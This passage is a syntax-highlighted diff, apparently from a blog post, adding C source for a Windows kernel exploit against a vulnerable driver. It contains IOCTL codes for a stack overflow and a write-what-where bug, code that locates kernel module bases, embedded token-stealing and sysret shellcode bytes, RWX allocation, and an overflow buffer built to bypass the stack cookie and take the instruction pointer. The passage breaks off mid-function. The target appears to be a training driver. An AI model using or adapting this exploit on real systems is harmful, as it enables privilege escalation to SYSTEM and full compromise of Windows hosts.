+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">const</span> UNICODE_STRING <span style="color:#f92672">*</span>PCUNICODE_STRING;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//from http://boinc.berkeley.edu/android-boinc/boinc/lib/diagnostics_win.h
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _VM_COUNTERS {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// the following was inferred by painful reverse engineering
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  SIZE_T                   PeakVirtualSize;     <span style="color:#75715e">// not actually
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  SIZE_T         PageFaultCount;
+</span></span><span style="display:flex;"><span>  SIZE_T         PeakWorkingSetSize;
+</span></span><span style="display:flex;"><span>  SIZE_T         WorkingSetSize;
+</span></span><span style="display:flex;"><span>  SIZE_T         QuotaPeakPagedPoolUsage;
+</span></span><span style="display:flex;"><span>  SIZE_T         QuotaPagedPoolUsage;
+</span></span><span style="display:flex;"><span>  SIZE_T         QuotaPeakNonPagedPoolUsage;
+</span></span><span style="display:flex;"><span>  SIZE_T         QuotaNonPagedPoolUsage;
+</span></span><span style="display:flex;"><span>  SIZE_T         PagefileUsage;
+</span></span><span style="display:flex;"><span>  SIZE_T         PeakPagefileUsage;
+</span></span><span style="display:flex;"><span>  SIZE_T         VirtualSize;           <span style="color:#75715e">// not actually
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} VM_COUNTERS;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">enum</span> _KWAIT_REASON
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  Executive <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>  FreePage <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>  PageIn <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>  PoolAllocation <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>,
+</span></span><span style="display:flex;"><span>  DelayExecution <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>,
+</span></span><span style="display:flex;"><span>  Suspended <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>,
+</span></span><span style="display:flex;"><span>  UserRequest <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>,
+</span></span><span style="display:flex;"><span>  WrExecutive <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>,
+</span></span><span style="display:flex;"><span>  WrFreePage <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>,
+</span></span><span style="display:flex;"><span>  WrPageIn <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>,
+</span></span><span style="display:flex;"><span>  WrPoolAllocation <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>,
+</span></span><span style="display:flex;"><span>  WrDelayExecution <span style="color:#f92672">=</span> <span style="color:#ae81ff">11</span>,
+</span></span><span style="display:flex;"><span>  WrSuspended <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>,
+</span></span><span style="display:flex;"><span>  WrUserRequest <span style="color:#f92672">=</span> <span style="color:#ae81ff">13</span>,
+</span></span><span style="display:flex;"><span>  WrEventPair <span style="color:#f92672">=</span> <span style="color:#ae81ff">14</span>,
+</span></span><span style="display:flex;"><span>  WrQueue <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>,
+</span></span><span style="display:flex;"><span>  WrLpcReceive <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>,
+</span></span><span style="display:flex;"><span>  WrLpcReply <span style="color:#f92672">=</span> <span style="color:#ae81ff">17</span>,
+</span></span><span style="display:flex;"><span>  WrVirtualMemory <span style="color:#f92672">=</span> <span style="color:#ae81ff">18</span>,
+</span></span><span style="display:flex;"><span>  WrPageOut <span style="color:#f92672">=</span> <span style="color:#ae81ff">19</span>,
+</span></span><span style="display:flex;"><span>  WrRendezvous <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>,
+</span></span><span style="display:flex;"><span>  Spare2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>,
+</span></span><span style="display:flex;"><span>  Spare3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">22</span>,
+</span></span><span style="display:flex;"><span>  Spare4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">23</span>,
+</span></span><span style="display:flex;"><span>  Spare5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span>,
+</span></span><span style="display:flex;"><span>  WrCalloutStack <span style="color:#f92672">=</span> <span style="color:#ae81ff">25</span>,
+</span></span><span style="display:flex;"><span>  WrKernel <span style="color:#f92672">=</span> <span style="color:#ae81ff">26</span>,
+</span></span><span style="display:flex;"><span>  WrResource <span style="color:#f92672">=</span> <span style="color:#ae81ff">27</span>,
+</span></span><span style="display:flex;"><span>  WrPushLock <span style="color:#f92672">=</span> <span style="color:#ae81ff">28</span>,
+</span></span><span style="display:flex;"><span>  WrMutex <span style="color:#f92672">=</span> <span style="color:#ae81ff">29</span>,
+</span></span><span style="display:flex;"><span>  WrQuantumEnd <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>,
+</span></span><span style="display:flex;"><span>  WrDispatchInt <span style="color:#f92672">=</span> <span style="color:#ae81ff">31</span>,
+</span></span><span style="display:flex;"><span>  WrPreempted <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>,
+</span></span><span style="display:flex;"><span>  WrYieldExecution <span style="color:#f92672">=</span> <span style="color:#ae81ff">33</span>,
+</span></span><span style="display:flex;"><span>  WrFastMutex <span style="color:#f92672">=</span> <span style="color:#ae81ff">34</span>,
+</span></span><span style="display:flex;"><span>  WrGuardedMutex <span style="color:#f92672">=</span> <span style="color:#ae81ff">35</span>,
+</span></span><span style="display:flex;"><span>  WrRundown <span style="color:#f92672">=</span> <span style="color:#ae81ff">36</span>,
+</span></span><span style="display:flex;"><span>  MaximumWaitReason <span style="color:#f92672">=</span> <span style="color:#ae81ff">37</span>
+</span></span><span style="display:flex;"><span>} KWAIT_REASON;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _SYSTEM_THREAD_INFORMATION {
+</span></span><span style="display:flex;"><span>  LARGE_INTEGER KernelTime;
+</span></span><span style="display:flex;"><span>  LARGE_INTEGER UserTime;
+</span></span><span style="display:flex;"><span>  LARGE_INTEGER CreateTime;
+</span></span><span style="display:flex;"><span>  ULONG WaitTime;
+</span></span><span style="display:flex;"><span>  PVOID StartAddress;
+</span></span><span style="display:flex;"><span>  CLIENT_ID ClientId;
+</span></span><span style="display:flex;"><span>  KPRIORITY Priority;
+</span></span><span style="display:flex;"><span>  LONG BasePriority;
+</span></span><span style="display:flex;"><span>  ULONG ContextSwitchCount;
+</span></span><span style="display:flex;"><span>  ULONG ThreadState;
+</span></span><span style="display:flex;"><span>  KWAIT_REASON WaitReason;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef _WIN64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  ULONG Reserved[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} SYSTEM_THREAD_INFORMATION, <span style="color:#f92672">*</span>PSYSTEM_THREAD_INFORMATION;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _SYSTEM_EXTENDED_THREAD_INFORMATION
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  SYSTEM_THREAD_INFORMATION ThreadInfo;
+</span></span><span style="display:flex;"><span>  PVOID StackBase;
+</span></span><span style="display:flex;"><span>  PVOID StackLimit;
+</span></span><span style="display:flex;"><span>  PVOID Win32StartAddress;
+</span></span><span style="display:flex;"><span>  PVOID TebAddress; <span style="color:#75715e">/* This is only filled in on Vista and above */</span>
+</span></span><span style="display:flex;"><span>  ULONG Reserved1;
+</span></span><span style="display:flex;"><span>  ULONG Reserved2;
+</span></span><span style="display:flex;"><span>  ULONG Reserved3;
+</span></span><span style="display:flex;"><span>} SYSTEM_EXTENDED_THREAD_INFORMATION, <span style="color:#f92672">*</span>PSYSTEM_EXTENDED_THREAD_INFORMATION;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _SYSTEM_EXTENDED_PROCESS_INFORMATION
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  ULONG NextEntryOffset;
+</span></span><span style="display:flex;"><span>  ULONG NumberOfThreads;
+</span></span><span style="display:flex;"><span>  LARGE_INTEGER SpareLi1;
+</span></span><span style="display:flex;"><span>  LARGE_INTEGER SpareLi2;
+</span></span><span style="display:flex;"><span>  LARGE_INTEGER SpareLi3;
+</span></span><span style="display:flex;"><span>  LARGE_INTEGER CreateTime;
+</span></span><span style="display:flex;"><span>  LARGE_INTEGER UserTime;
+</span></span><span style="display:flex;"><span>  LARGE_INTEGER KernelTime;
+</span></span><span style="display:flex;"><span>  UNICODE_STRING ImageName;
+</span></span><span style="display:flex;"><span>  KPRIORITY BasePriority;
+</span></span><span style="display:flex;"><span>  ULONG ProcessId;
+</span></span><span style="display:flex;"><span>  ULONG InheritedFromUniqueProcessId;
+</span></span><span style="display:flex;"><span>  ULONG HandleCount;
+</span></span><span style="display:flex;"><span>  ULONG SessionId;
+</span></span><span style="display:flex;"><span>  PVOID PageDirectoryBase;
+</span></span><span style="display:flex;"><span>  VM_COUNTERS VirtualMemoryCounters;
+</span></span><span style="display:flex;"><span>  SIZE_T PrivatePageCount;
+</span></span><span style="display:flex;"><span>  IO_COUNTERS IoCounters;
+</span></span><span style="display:flex;"><span>  SYSTEM_EXTENDED_THREAD_INFORMATION Threads[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>} SYSTEM_EXTENDED_PROCESS_INFORMATION, <span style="color:#f92672">*</span>PSYSTEM_EXTENDED_PROCESS_INFORMATION;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">enum</span> _SYSTEM_INFORMATION_CLASS {
+</span></span><span style="display:flex;"><span>  SystemExtendedProcessInformation <span style="color:#f92672">=</span> <span style="color:#ae81ff">57</span>
+</span></span><span style="display:flex;"><span>} SYSTEM_INFORMATION_CLASS;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">NTSTATUS</span>(WINAPI <span style="color:#f92672">*</span>PNtQuerySystemInformation)(
+</span></span><span style="display:flex;"><span>  __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
+</span></span><span style="display:flex;"><span>  __inout PVOID SystemInformation,
+</span></span><span style="display:flex;"><span>  __in ULONG SystemInformationLength,
+</span></span><span style="display:flex;"><span>  __out_opt PULONG ReturnLength
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* IOCTL */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define STACK_OVERFLOW_GS_IOCTL 0x222007
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ARBITRARY_WRITE_IOCTL 0x22200b
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structure used by Write-What-Where */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _WRITE_WHAT_WHERE
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>ullpWhat;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>ullpWhere;
+</span></span><span style="display:flex;"><span>} WRITE_WHAT_WHERE, <span style="color:#f92672">*</span>PWRITE_WHAT_WHERE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit Settings */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ALLOCATION_SIZE 0x900
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GetKernelModuleBase():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Function used to obtain kernel module address */</span>
+</span></span><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">GetKernelModuleBase</span>(PCHAR pKernelModule)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> pcDriver[<span style="color:#ae81ff">1024</span>]    <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  LPVOID lpvTargetDriver <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID <span style="color:#f92672">*</span>lpvDrivers     <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  DWORD dwCB             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwDrivers        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD i                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, dwCB, <span style="color:#f92672">&amp;</span>dwCB);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwCB <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvDrivers <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwCB <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(LPVOID));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvDrivers <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EnumDeviceDrivers</span>(lpvDrivers, dwCB, <span style="color:#f92672">&amp;</span>dwCB))
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    dwDrivers <span style="color:#f92672">=</span> dwCB <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(LPVOID);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwDrivers; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">GetDeviceDriverBaseNameA</span>(lpvDrivers[i], pcDriver, <span style="color:#66d9ef">sizeof</span>(pcDriver)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">StrStrA</span>(pcDriver, pKernelModule) <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>          lpvTargetDriver <span style="color:#f92672">=</span> lpvDrivers[i];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(lpvDrivers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> lpvTargetDriver;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* CheckWin():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Simple function to check if we&#39;re running as SYSTEM */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">CheckWin</span>(VOID)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  CHAR <span style="color:#f92672">*</span>cUsername <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(NULL, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwLen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    cUsername <span style="color:#f92672">=</span> (CHAR <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwLen <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(CHAR));
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate buffer for username check</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(cUsername, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  win <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(cUsername, <span style="color:#e6db74">&#34;SYSTEM&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(cUsername);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (win <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> win : <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GenerateExploitBuffer():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */</span>
+</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GenerateExploitBuffer</span>(LPVOID lpvNt, LPVOID lpvStackLeak, <span style="color:#66d9ef">uint64_t</span> cookie, LPVOID lpvBuffer)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  LPVOID shellcode <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> nt <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)(lpvNt);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> stack <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)(lpvStackLeak);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>payload <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(lpvBuffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint8_t</span> sc[<span style="color:#ae81ff">129</span>] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// sickle-tool -p windows/x64/kernel_token_stealer -f num (58 bytes)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x80</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xb2</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x04</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x04</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// sickle-tool -p windows/x64/kernel_sysret -f num (71)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x88</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x8a</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x9a</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0xaa</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0x0f</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xf8</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x0f</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x07</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, <span style="color:#66d9ef">sizeof</span>(sc), MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (shellcode <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate memory for shellcode</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">RtlCopyMemory</span>(shellcode, sc, <span style="color:#ae81ff">129</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Adjust the stack pointer */</span>
+</span></span><span style="display:flex;"><span>  stack <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0xb30</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Writing stack cookie @{0x%p}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, stack);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Overflow past the size of the buffer */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> (<span style="color:#ae81ff">512</span> <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint64_t</span>)); i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    payload[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (stack <span style="color:#f92672">^</span> cookie); <span style="color:#75715e">/* Stack Cookie */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Offset to shellcode start */</span>
+</span></span><span style="display:flex;"><span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4343434343434343</span>;
+</span></span><span style="display:flex;"><span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4444444444444444</span>;
